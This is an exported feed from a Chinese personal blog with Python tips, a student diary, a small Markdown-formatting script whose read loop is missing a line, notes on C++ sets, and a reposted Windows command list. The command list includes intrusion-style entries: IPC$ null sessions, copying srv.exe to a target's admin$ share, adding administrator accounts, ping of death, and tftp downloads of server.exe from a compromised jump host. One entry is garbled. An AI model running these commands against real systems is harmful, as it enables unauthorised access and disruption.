        <content type="html"><![CDATA[<p>怎么样使用Python才会显得高大上呢！，用Python来解决一些问题相当简单，有了思路就可以动手去做了，但是既然知道了Python的特性，就要在coding中注意代码的质量和简洁性。</p><p>一、首先，Python含有很多类库、可扩展库，还有很多开源项目，但是不能忽略其中的内置函数库，下面通过演示使用内置函数，提高编写代码的质量的简洁性。</p><ol><li><p>内置函数enumerate来代替range()进行迭代。enumerate可以返回每个元素的索引和值。</p><p>enumerate(list, start=num)# 可以通过设置start来设置其实偏移量</p></li><li><p>列表推导式比map和filter函数表达更加清晰</p><p>列表推导式更容易使得代码变得可读。</p></li><li><p>使用breakpoint来进行调试而不是print</p><p>事实情况就是在编码过程中使用print很不美观并且导致代码很乱</p></li><li><p>使用f-string来格式化字符串</p><p>f-string支持使用字符串格式化迷你语言和字符串插值</p><p>name, age = cook, 12</p><p>return f’my name is {name} and i`m {age/10.5f} decades old.’</p></li><li><p>使用sorted()对复杂列表进行排序</p><p>sorted()#设置reverse可以进行降序排序，设置key可以设置以什么字段排序</p></li></ol><p>二、以后其次进行算法面试过程中，数据结构是考察的重点，在编码过程中要注意选择合适的数据结构来实现思路。</p><ol><li><p>使用set存储唯一值</p><p>可以在数据集中删除重复的值</p></li><li><p>利用生成器来生成大量序列，这样更省内存。在读取大量数据到内存中进行计算中有明显优势。</p></li><li><p>使用字典的get(key, default)方法，它的作用就是检查key是否在字典中，在的话返回key的value不在的话返回默认。</p><p>但是如果想用默认值来更新key中的value 呢，则需要使用字典的setdefault(key, default)方法.即查找key是否在dict中，如果存在返回value，如果不存在使用default值更新字典。</p></li></ol><p>三、学会使用标准库将会事半功倍</p><ol><li><p>使用collections.defaultdict处理缺少的字典键，</p><p>from import defaultdict<br />new_dict = defaultdict(list)#使用无参数的list作为默认值，当名字不存在时返回一个空列表[]</p><p>这一部分不太明白找时间看源码</p></li><li><p>collections.Counter来计算Hashable对象</p><p>Couter是dict的子类，使用0作为任何缺失元素的默认值，并且更容易计算对象的出现次数。<br />将单词传入给Counter时，会存储每个单词和单词在列表中出现的次数。<br />调用most_common可以返回最多出现的单词</p></li><li><p>使用字符串常量访问公共字符串组</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line">string.ascii_uppercase<span class="comment"># "ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span></pre></td></tr></table></figure><ol start="4"><li><p>使用Itertools生成排列和组合</p><p>itertools.permutations()#生成所有可能，顺序有效<br />itertools.combinations()#去掉重复可能，无关顺序</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>悠悠天地，奈何独立苍茫</title>
      <link href="/archives/c82868cc.html"/>
      <url>/archives/c82868cc.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>悠悠天地，奈何独立苍茫！</p></blockquote><p>又一届师哥师姐毕业了，看着实验室只剩自己一个人关电闸，差点眼泪掉下来。自己一个人呆着就回忆起来这两年的读研经历。</p><h1 id="刚"><a class="markdownIt-Anchor" href="#刚"></a> 刚</h1><p>想起来并不是自己一个人在这里，实验室还有老鼠陪着我，要是说刚进实验室的时候，给我印象最深的也就是这帮老鼠了，一开门就是满桌子的老鼠屎，一桌拉完还有另外一桌，虽说没有什么味道，但还是挺恶心。更没想到的是，到最后排列杂乱的排泄物还是我最近清理掉的，前前后后经历了一年！门口路由器旁边坐的是一个胖胖的师哥，那时候他手里就有SCI在手，仍然奋斗在仿真一线，用他话说就是“没办法啊，老师还让我发一篇”，真是招人羡慕。之后所里的人都到齐了，不多不少三男一女，妥了！再然后就是一两个月的熟悉期，师哥给我们介绍了所里的环境和人际关系，更重要的是介绍了毕业答辩等一系列的事情，简直是读研手册，就这样几个人在这个破所里面，慢慢适应、交流，充满人情味。之后就是面临中期的开题，我开始出现了焦虑恐惧症，一是因为我真的没有思路，二是老师只问我我怎么想，那段时间整天就是查文献，翻译文献，定方案，写总结，最后一个方案没有出来，没办法去找老师交流，交流也是无功而返，还是那一句你怎么想，其实我的梦想就是老师你也给我几篇文献我去研究下，让我毕业就好！少年不知愁滋味，读了研才知道水这么深的，总之最后还是定了一个的方案，全程自己搞，最后答辩当然是哗啦啦。答辩甜蜜期过完，就进入论文准备阶段。</p><h1 id="研"><a class="markdownIt-Anchor" href="#研"></a> 研</h1><p>究生嘛，只要不是为了搞研究，其实就是在研究人际交流，到最后拿着毕业证，总有适合自己的发展天地。所以秉承不搞研究，只为工作的思想，开始新的选择，学习编程。话说软件开发哪有那么简单，以前只是被程序员这个概念完全的迷惑了，程序员的工作内容，我认为是具有创造性的工作，这在我学习过程中体现的淋漓尽致，简单调用一个函数，导入一个包谁都会，但是怎么有逻辑性的将各个模块整合起来，如果没有经过训练是难以完美实现的，就比如你心里想的是范冰冰，但是经过自己手可能搞出来一个特朗普，丫的！还带有一大堆错误，难看，难受！本科阶段短暂的学过C和C<ins>但是那点基础知识掌握的远远不够，和我女朋友聊起编程的内容，这个毕业两年的科班毕业生，奋斗在国企的保洁员工，掌握的知识都我全，和科班生是真的有差距，但是对于科班生相比，我们这些专业学过的基础学科确实他们没有经过的培训，所以我把目标定在了能够和他们进行竞争的数据分析和机器学习方向，经过了解现在AI火的一塌糊涂，Python也成了热门语言，我自然而然的成了Python语言的拥护者，学起来入门是真的简单，相比C</ins>来说，真是良心语言，具体的缺点我还没搞懂，但是就是简单好学，有想法可以借助Python库和开源代码实现。确定好目标之后陆陆续续学了Linux基础命令、Python基础、Python高级特性、数据分析、数据挖掘实战、西瓜书…今年开始找实习的时候才开始慌了，数据分析报录比40:1，难以想象的火爆，看来当初的分析还是有偏差，就比如今年我们学校考研报名人数超多，那么肯定有大部分人当了炮灰，啧啧啧！没跑了，我在填炮坑的路上！路漫漫其修远兮，吾将上下而求索。现在该怎么办呢！是改变方向还是继续选择走这条道路呢！</p><p><img src="%E5%88%86%E5%8F%89%E8%B7%AF.jpg" alt="" /></p><h1 id="明"><a class="markdownIt-Anchor" href="#明"></a> 明</h1><p>天，老舅来上海出差，还是试着向老舅寻求帮助…</p><h1 id="后"><a class="markdownIt-Anchor" href="#后"></a> 后</h1><p>续来了呆了两天，分析后得到的结论是，胆大心细，擅于观察行业内的细节和动向。最重要的还是态度积极端正，未来可期！</p><pre><code>                                          2019/4/27 星期六 下午 4:16:33</code></pre>]]></content>
      
      
      <categories>
          
          <category> 生活随笔 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>批量添加无序号列表格式</title>
      <link href="/archives/b759e75d.html"/>
      <url>/archives/b759e75d.html</url>
      
        <content type="html"><![CDATA[<p>在整理命令列表的时候，使用MD的时候，发现没办法批量添加无序列表，所以用python实现了下.</p><p>源代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">2</span></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">3</span></pre></td><td class="code"><pre><span class="line"><span class="string">    方便以后编写Markdown文档时候批量生成无序列表</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">4</span></pre></td><td class="code"><pre><span class="line"><span class="string">    将需要操作的内容保存到制定文件中，然后运行程序即可。</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">5</span></pre></td><td class="code"><pre><span class="line"><span class="string">"""</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">6</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#添加无序列表格式’- ‘</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geshiHua</span><span class="params">(file)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">    bk_file = create_bk(file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">    file_list = []</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">with</span> open(bk_file, <span class="string">'r'</span>, encoding=<span class="string">'utf-8'</span>) <span class="keyword">as</span> f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">            file_list.append(line)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#    print(file_list)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'w'</span>) <span class="keyword">as</span> f:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_list:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">if</span> line == <span class="string">'\n'</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">               f.write(line)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">            line = <span class="string">"- "</span> + line</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">            f.write(line)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">24</span></pre></td><td class="code"><pre><span class="line">    auth = input(<span class="string">'是否删除原文件备份（y/n）：'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">25</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> auth == <span class="string">'y'</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">26</span></pre></td><td class="code"><pre><span class="line">        os.remove(bk_file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">27</span></pre></td><td class="code"><pre><span class="line">        print(<span class="string">'备份文件已删除！'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">28</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">else</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">29</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">pass</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">30</span></pre></td><td class="code"><pre><span class="line">    print(file + <span class="string">':已经格式化完成'</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">31</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">32</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">33</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建备份文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">34</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_bk</span><span class="params">(file)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">35</span></pre></td><td class="code"><pre><span class="line">    bk_file = file + <span class="string">'.bk'</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">36</span></pre></td><td class="code"><pre><span class="line">    os.rename(file, bk_file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">37</span></pre></td><td class="code"><pre><span class="line">    <span class="keyword">return</span> bk_file</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">38</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">39</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">40</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#删除备份文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">41</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(file)</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">42</span></pre></td><td class="code"><pre><span class="line">    os.remove(file)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">43</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">44</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">45</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#主程序</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">46</span></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">47</span></pre></td><td class="code"><pre><span class="line">    file_path =  <span class="string">r'./add_style_md.md'</span><span class="comment">#用来保存待添加格式的文件</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">48</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#    print(file_path)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">49</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#    file_path ="\\" .join(file_path)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">50</span></pre></td><td class="code"><pre><span class="line"><span class="comment">#   print(file_path)</span></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">51</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">52</span></pre></td><td class="code"><pre><span class="line">    geshiHua(file_path)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">53</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">54</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">55</span></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">56</span></pre></td><td class="code"><pre><span class="line">    main()</span></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>C++中的set！</title>
      <link href="/archives/fcc57c4c.html"/>
      <url>/archives/fcc57c4c.html</url>
      
        <content type="html"><![CDATA[<ul><li><p>set的特点是：集合中的元素根据键值自动排序，没有重复元素</p></li><li><p>声明：</p><p>set &lt;类型&gt; 名称   如： set<int>s1;</p></li><li><p>set中的函数</p><ul><li><p>begin()返回指向第一个元素的迭代器</p></li><li><p>end()返回指向最后一个元素的迭代器</p></li><li><p>erase()–删除元素      只能根据元素的值删除元素，不能根据第几个元素进行删除</p></li><li><p>insert()–插入元素</p></li><li><p>clear()–清除所有元素</p></li></ul></li><li><p>count()–返回某个值元素的个数</p></li><li><p>empty()–如果集合为空，返回true equal_range()–返回集合中与给定值相等的上下限的两个迭代器</p></li><li><p>find()–返回一个指向被查找到元素的迭代器</p></li><li><p>get_allocator()–返回集合的分配器</p></li><li><p>lower_bound()–返回指向大于（或等于）某值的第一个元素的迭代器</p></li><li><p>key_comp()–返回一个用于元素间值比较的函数</p></li><li><p>max_size()–返回集合能容纳的元素的最大限值</p></li><li><p>rbegin()–返回指向集合中最后一个元素的反向迭代器</p></li><li><p>rend()–返回指向集合中第一个元素的反向迭代器</p></li><li><p>size()–集合中元素的数目</p></li><li><p>swap()–交换两个集合变量</p></li><li><p>upper_bound()–返回大于某个值元素的迭代器</p></li><li><p>value_comp()–返回一个用于比较元素间的值的函数</p></li></ul><p>关于迭代器：<br />声明：set&lt;类型&gt;::iterator 名称<br />set<int>::iterator it=s.begin();</p><p>注**迭代器的类型要与定义的set类型相同<br />**<br />访问迭代器指向元素时使用  *名称<br />cout&lt;&lt;*it&lt;&lt;endl;</p><p>迭代器能自增<code>++it</code>;，</p><p>也可以使用</p><ul><li>it + n;</li><li>it - n;</li><li>it += n;</li><li>it -= n;</li><li>it1 - it2;</li></ul><p>以上操作的结果还是迭代器；</p><p></p>]]></content>
      
      
      <categories>
          
          <category> 技术经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows下常用命令</title>
      <link href="/archives/aee69fbc.html"/>
      <url>/archives/aee69fbc.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>转载：<a href="https://www.jb51.net/article/141568.htm" target="_blank" rel="noopener">https://www.jb51.net/article/141568.htm</a></p></blockquote><h1 id="常用命令"><a class="markdownIt-Anchor" href="#常用命令"></a> 常用命令：</h1><ul><li>直接输入盘符就可以进入相应盘，如：e:</li><li>cd: 进入文件夹</li><li>md: 创建文件夹</li><li>type nul&gt;: 创建空文件</li><li>echo “内容”&gt;: 创建带内容的文件</li><li>type: 查看文件内容</li><li>dir: 列出文件</li><li>rd: 删除空文件夹</li><li>rd /s/q: 删除文件及其子文件夹，包括有内容的文件</li><li>del: 删除文件</li></ul><p>在DOS窗口下使用命令 help：</p><ul><li>ASSOC          显示或修改文件扩展名关联。</li><li>ATTRIB         显示或更改文件属性。</li><li>BREAK          设置或清除扩展式 CTRL+C 检查。</li><li>BCDEDIT        设置启动数据库中的属性以控制启动加载。</li><li>CACLS          显示或修改文件的访问控制列表(ACL)。</li><li>CALL           从另一个批处理程序调用这一个。</li><li>CD             显示当前目录的名称或将其更改。</li><li>CHCP           显示或设置活动代码页数。</li><li>CHDIR          显示当前目录的名称或将其更改。</li><li>CHKDSK         检查磁盘并显示状态报告。</li><li>CHKNTFS        显示或修改启动时间磁盘检查。</li><li>CLS            清除屏幕。</li><li>CMD            打开另一个 Windows 命令解释程序窗口。</li><li>COLOR          设置默认控制台前景和背景颜色。</li><li>COMP           比较两个或两套文件的内容。</li><li>COMPACT        显示或更改 NTFS 分区上文件的压缩。</li><li>CONVERT        将 FAT 卷转换成 NTFS。您不能转换当前驱动器。</li><li>COPY           将至少一个文件复制到另一个位置。</li><li>DATE           显示或设置日期。</li><li>DEL            删除至少一个文件。</li><li>DIR            显示一个目录中的文件和子目录。</li><li>DISKCOMP       比较两个软盘的内容。</li><li>DISKCOPY       将一个软盘的内容复制到另一个软盘。</li><li>DISKPART       显示或配置磁盘分区属性。</li><li>DOSKEY         编辑命令行、调用 Windows 命令并创建宏。</li><li>DRIVERQUERY    显示当前设备驱动程序状态和属性。</li><li>ECHO           显示消息，或将命令回显打开或关上。</li><li>ENDLOCAL       结束批文件中环境更改的本地化。</li><li>ERASE          删除一个或多个文件。</li><li>EXIT           退出 CMD.EXE 程序(命令解释程序)。</li><li>FC             比较两个文件或两个文件集并显示它们之间的不同。</li><li>FIND           在一个或多个文件中搜索一个文本字符串。</li><li>FINDSTR        在多个文件中搜索字符串。</li><li>FOR            为一套文件中的每个文件运行一个指定的命令。</li><li>FORMAT         格式化磁盘，以便跟 Windows 使用。</li><li>FSUTIL         显示或配置文件系统的属性。</li><li>FTYPE          显示或修改用在文件扩展名关联的文件类型。</li><li>GOTO           将 Windows 命令解释程序指向批处理程序中某个带标签的行。</li><li>GPRESULT       显示机器或用户的组策略信息。</li><li>GRAFTABL       启用 Windows 在图形模式显示扩展字符集。</li><li>HELP           提供 Windows 命令的帮助信息。</li><li>ICACLS         显示、修改、备份或还原文件和目录的 ACL。</li><li>IF             在批处理程序中执行有条件的处理过程。</li><li>LABEL          创建、更改或删除磁盘的卷标。</li><li>MD             创建一个目录。</li><li>MKDIR          创建一个目录。</li><li>MKLINK         创建符号链接和硬链接</li><li>MODE           配置系统设备。</li><li>MORE           逐屏显示输出。</li><li>MOVE           将一个或多个文件从一个目录移动到另一个目录。</li><li>OPENFILES      显示远程用户为了文件共享而打开的文件。</li><li>PATH           为可执行文件显示或设置搜索路径。</li><li>PAUSE          停止批处理文件的处理并显示信息。</li><li>POPD           还原由 PUSHD 保存的当前目录上一次的值。</li><li>PRINT          打印一个文本文件。</li><li>PROMPT         改变 Windows 命令提示。</li><li>PUSHD          保存当前目录，然后对其进行更改。</li><li>RD             删除目录。</li><li>RECOVER        从损坏的磁盘中恢复可读取的信息。</li><li>REM            记录批处理文件或 CONFIG.SYS 中的注释。</li><li>REN            重新命名文件。</li><li>RENAME         重新命名文件。</li><li>REPLACE        替换文件。</li><li>RMDIR          删除目录。</li><li>ROBOCOPY       复制文件和目录树的高级实用程序</li><li>SET            显示、设置或删除 Windows 环境变量。</li><li>SETLOCAL       开始用批文件改变环境的本地化。</li><li>SC             显示或配置服务(后台处理)。</li><li>SCHTASKS       安排命令和程序在一部计算机上按计划运行。</li><li>SHIFT          调整批处理文件中可替换参数的位置。</li><li>SHUTDOWN       让机器在本地或远程正确关闭。</li><li>SORT           将输入排序。</li><li>START          打开单独视窗运行指定程序或命令。</li><li>SUBST          将驱动器号与路径关联。</li><li>SYSTEMINFO     显示机器的具体的属性和配置。</li><li>TASKLIST       显示包括服务的所有当前运行的任务。</li><li>TASKKILL       终止正在运行的进程或应用程序。</li><li>TIME           显示或设置系统时间。</li><li>TITLE          设置 CMD.EXE 会话的窗口标题。</li><li>TREE           以图形显示启动器或路径的目录结构。</li><li>TYPE           显示文本文件的内容。</li><li>VER            显示 Windows 的版本。</li><li>VERIFY         告诉 Windows 验证文件是否正确写入磁盘。</li><li>VOL            显示磁盘卷标和序列号。</li><li>XCOPY          复制文件和目录树。</li><li>WMIC           在交互命令外壳里显示 WMI 信息。</li></ul><h1 id="查询表"><a class="markdownIt-Anchor" href="#查询表"></a> 查询表：</h1><hr /><ul><li><p>net use ipipc$ &quot; &quot; /user:&quot; &quot; 建立IPC空链接</p></li><li><p>net use ipipc$ “密码” /user:“用户名” 建立IPC非空链接</p></li><li><p>net use h: ipc$ “密码” /user:“用户名” 直接登陆后映射对方C：到本地为H:</p></li><li><p>net use h: ipc$ 登陆后映射对方C：到本地为H:</p></li><li><p>net use ipipc$ /del 删除IPC链接</p></li><li><p>net use h: /del 删除映射对方到本地的为H:的映射</p></li><li><p>net user 用户名　密码　/add 建立用户</p></li><li><p>net user guest /active:yes 激活guest用户</p></li><li><p>net user 查看有哪些用户</p></li><li><p>net user 帐户名 查看帐户的属性</p></li><li><p>net localgroup administrators 用户名 /add 把“用户”添加到管理员中使其具有管理员权限</p></li><li><p>net start 查看开启了哪些服务</p></li><li><p>net start 服务名　开启服务；(如:net start telnet， net start schedule)</p></li><li><p>net stop 服务名 停止某服务</p></li><li><p>net time 目标ip 查看对方时间</p></li><li><p>net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上参数/yes可取消确认信息</p></li><li><p>net view 查看本地局域网内开启了哪些共享</p></li><li><p>net view ip 查看对方局域网内开启了哪些共享</p></li><li><p>net config 显示系统网络设置</p></li><li><p>net logoff 断开连接的共享</p></li><li><p>net pause 服务名 暂停某服务</p></li><li><p>net send ip “文本信息” 向对方发信息</p></li><li><p>net ver 局域网内正在使用的网络连接类型和信息</p></li><li><p>net share 查看本地开启的共享</p></li><li><p>net share ipc$ 开启ipc$共享</p></li><li><p>net share ipc$ /del 删除ipc$共享</p></li><li><p>net share c$ /del 删除C：共享</p></li><li><p>net user guest 12345 用guest用户登陆后用将密码改为12345</p></li><li><p>net password 密码 更改系统登陆密码</p></li><li><p>netstat -a 查看开启了哪些端口,常用netstat -an</p></li><li><p>netstat -n 查看端口的网络连接情况，常用netstat -an</p></li><li><p>netstat -v 查看正在进行的工作</p></li><li><p>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</p></li><li><p>netstat -s 查看正在使用的所有协议使用情况</p></li><li><p>nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名</p></li><li><p>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设置超时间隔。</p></li><li><p>ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]数据包大小”；“-n发送数据次数”；“-t”指一直ping。</p></li><li><p>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死亡之ping)</p></li><li><p>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip地址，ipconfig可用参数“/all”显示全部配置信息</p></li><li><p>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p></li><li><p>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安装的，在安装目录的Support/tools文件夹内)</p></li><li><p>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删除除只读、隐藏、系统、存档以外的文件。例如“DEL/AR <em>.</em>”表示删除当前目录下所有只读文件，“DEL/A-S <em>.</em>”表示删除当前目录下除系统文件以外的所有文件</p></li><li><p>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。（二个命令作用相同）</p></li><li><p>move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</p></li><li><p>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt文件中，&quot;&gt; “和”&gt; &gt;&quot; 是重定向命令</p></li><li><p>at id号 开启已注册的某个计划任务</p></li><li><p>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</p></li><li><p>at id号 /delete 停止某个已注册的计划任务</p></li><li><p>at 查看所有的计划任务</p></li><li><p>at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算机</p></li><li><p>finger username @host 查看最近有哪些用户登陆</p></li><li><p>telnet ip 端口 远和登陆服务器,默认端口为23</p></li><li><p>open ip 连接到IP（属telnet登陆后的命令）</p></li><li><p>telnet 在本机上直接键入telnet 将进入本机的telnet</p></li><li><p>copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y就同时取消确认你要改写一份现存目录文件</p></li><li><p>copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</p></li><li><p>copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指二进制文件，/a指ASCLL格式文件</p></li><li><p>copy ipadmin<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>v</mi><mi>v</mi><mi mathvariant="normal">.</mi><mi>e</mi><mi>x</mi><mi>e</mi><mi>c</mi><mo>:</mo><mi mathvariant="normal">或</mi><mo>:</mo><mi>c</mi><mi>o</mi><mi>p</mi><mi>y</mi><mi>i</mi><mi>p</mi><mi>a</mi><mi>d</mi><mi>m</mi><mi>i</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">svv.exe c: 或:copyipadmin</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord">.</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord cjk_fallback">或</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span></span></span></span><em>.</em> 复制对方admini$共享下的srv.exe文件（所有文件）至本地C：</p></li><li><p>xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将不提示覆盖相同文件</p></li><li><p>用参数/e才可连目录下的子目录一起复制到目标地址下。</p></li><li><p>tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe c:server.exe 登陆后，将“IP”的server.exe下载到目标主机c:server.exe 参数：-i指以二进制模式传送，如传送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进行传送</p></li><li><p>tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主机</p></li><li><p>ftp ip 端口 